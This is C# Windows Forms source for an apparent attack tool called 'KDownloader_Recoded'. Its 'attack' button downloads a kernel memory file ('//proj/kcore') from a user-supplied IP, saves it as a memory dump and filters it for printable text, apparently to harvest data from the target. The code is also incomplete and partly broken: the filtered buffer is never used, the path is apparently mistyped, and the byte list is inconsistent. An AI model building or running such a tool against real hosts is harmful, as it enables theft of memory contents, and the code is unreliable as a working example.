using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KDownloader_Recoded
{
    public partial class kcore : Form
    {
        public kcore()
        {
            InitializeComponent();
        }

        public List<Byte> memDat = new List<Byte> { };
        public TimeWebClient w = new TimeWebClient();
        public string ipAddr = "";
        public string path = "";
        public Random rnd = new Random();
        public Thread dl;
        public string fileName = "";
        private void btn_attack_Click(object sender, EventArgs e)
        {
            ipAddr = tb_ipaddr.Text;
            startMemDatDl();
        }
        private void kcore_Load(object sender, EventArgs e)
        {
            path = System.Reflection.Assembly.GetEntryAssembly().Location;
        }
        public void startMemDatDl()
        {
            rndFuncs rn = new rndFuncs();
            string rndFilePref = rn.RandomString(5);
            dl = new Thread(() => {
                w.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);
                w.DownloadFileAsync(new Uri(ipAddr + "//proj/kcore"), path + "/" + rndFilePref + "_memory.dmp");
                fileName = path + "/" + rndFilePref + "_memory.dmp";
            });
            dl.Start();
        }

        public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            int[] dlPrcs = { 0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100 };
            this.BeginInvoke((MethodInvoker)delegate {
                if (dlPrcs.Contains(e.ProgressPercentage))
                {
                    print(Color.DarkGreen, "Downloading data: " + e.ProgressPercentage + "%");
                }

                if(e.BytesReceived > 4500000)
                {
                    this.BeginInvoke((MethodInvoker)delegate {
                        print(Color.Orange, "Download was over 4.5MB, closing early.");
                    });
                    dl.Abort();
                    scanMemData();
                }
            });
        }
        public void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            this.BeginInvoke((MethodInvoker)delegate {
                print(Color.DarkGreen, "Downloading data: Done");
            });
            scanMemData();
        }
        public void scanMemData()
        {
            memDat = File.ReadAllBytes(fileName).ToList();
            byte[] printables = new byte[] { 27, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x5c, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e };
            List<Byte> buffer = new List<Byte> { };
            foreach(byte b in memDat)
            {
                if (printables.Contains(b))
                {
                    buffer.Add(b);
                }
            }
        }

        private void lb_draw(object sender, DrawItemEventArgs e)
        {
           colourItem item = lb_console.Items[e.Index] as colourItem;
           if (item != null)
           {
               e.Graphics.DrawString(item.Message, lb_console.Font, new SolidBrush(item.ItemColor), 0, e.Index * lb_console.ItemHeight);
           }
           else
           {

           }        
        }

        public void print(Color c, string text)
        {
            lb_console.Items.Insert(0, new colourItem(c, text));
        }
    }
}
